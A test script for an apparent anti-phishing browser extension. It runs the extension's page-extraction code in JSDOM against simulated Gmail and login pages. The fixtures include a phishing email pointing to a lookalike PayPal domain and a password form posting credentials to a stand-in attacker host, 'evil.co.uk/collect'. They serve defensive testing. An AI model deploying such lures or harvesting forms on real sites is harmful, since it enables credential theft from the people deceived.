import { JSDOM } from "jsdom";
import fs from "fs";
import path from "path";

const root = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const source = fs.readFileSync(path.join(root, "extension/content.js"), "utf8");

function runScenario(name, { url, html, expect }) {
  const dom = new JSDOM(html, { url, runScripts: "outside-only" });
  const { window } = dom;
  Object.defineProperty(window.HTMLElement.prototype, "innerText", {
    configurable: true,
    get() {
      return this.textContent;
    },
    set(value) {
      this.textContent = value;
    },
  });

  let listener = null;
  window.chrome = {
    runtime: {
      lastError: null,
      sendMessage(message, callback) {
        if (callback) callback({ verdict: "legitimate" });
      },
      onMessage: {
        addListener(fn) {
          listener = fn;
        },
      },
    },
    storage: {
      local: {
        get(defaults, callback) {
          callback({ autoScan: false, ...defaults });
        },
      },
    },
  };

  window.eval(source);

  let extracted = null;
  listener({ type: "EXTRACT_PAGE" }, {}, (response) => {
    extracted = response;
  });

  const failures = [];
  for (const [key, check] of Object.entries(expect)) {
    if (typeof check === "function") {
      if (!check(extracted)) failures.push(key);
    } else if (extracted[key] !== check) {
      failures.push(`${key}: expected ${JSON.stringify(check)}, got ${JSON.stringify(extracted[key])}`);
    }
  }

  console.log(`${failures.length ? "FAIL" : "PASS"}  ${name}`);
  if (failures.length) {
    for (const failure of failures) console.log(`      ${failure}`);
    console.log(JSON.stringify(extracted, null, 2).slice(0, 1200));
  }
  return failures.length;
}

let failures = 0;

failures += runScenario("Gmail message body", {
  url: "https://mail.google.com/mail/u/0/#inbox/abc",
  html: `<html><head><title>Inbox - Gmail</title></head><body>
    <h2 class="hP">Your account will be suspended</h2>
    <div class="a3s">Verify your account now at http://paypal-secure-login.xyz/verify
      <a href="http://paypal-secure-login.xyz/verify">Verify now</a>
    </div>
    <a href="https://mail.google.com/help">Help</a>
  </body></html>`,
  expect: {
    kind: "email",
    secure: true,
    hostname: "mail.google.com",
    title: (page) => page.title.startsWith("Your account will be suspended"),
    text: (page) => page.text.includes("paypal-secure-login.xyz"),
    links: (page) =>
      page.links.length === 1 &&
      page.links[0].href.includes("paypal-secure-login.xyz"),
  },
});

failures += runScenario("Gmail inbox has no message body", {
  url: "https://mail.google.com/mail/u/0/#inbox",
  html: `<html><head><title>Inbox - Gmail</title></head><body>
    <div>Primary</div><div>Your account will be suspended</div>
  </body></html>`,
  expect: {
    kind: "page",
    text: "",
  },
});

failures += runScenario("Login page with cross-origin password form", {
  url: "https://login.example.co.uk/signin",
  html: `<html><head><title>Sign in</title></head><body>
    <form action="https://evil.co.uk/collect" method="post">
      <input type="email" name="email">
      <input type="password" name="password">
    </form>
  </body></html>`,
  expect: {
    kind: "page",
    secure: true,
    title: "Sign in",
    text: (page) => page.text === "",
    forms: (page) =>
      page.forms.length === 1 &&
      page.forms[0].hasPassword === true &&
      page.forms[0].crossOrigin === true &&
      page.forms[0].method === "post",
  },
});

failures += runScenario("Same-brand login form is not cross-origin", {
  url: "https://www.paypal.com/signin",
  html: `<html><head><title>Log in to PayPal</title></head><body>
    <form action="https://www.paypal.com/signin" method="post">
      <input type="password" name="password">
    </form>
  </body></html>`,
  expect: {
    forms: (page) => page.forms.length === 1 && page.forms[0].crossOrigin === false,
    secure: true,
  },
});

console.log(failures ? `\n${failures} expectation(s) failed` : "\nall DOM scenarios passed");
process.exit(failures ? 1 : 0);
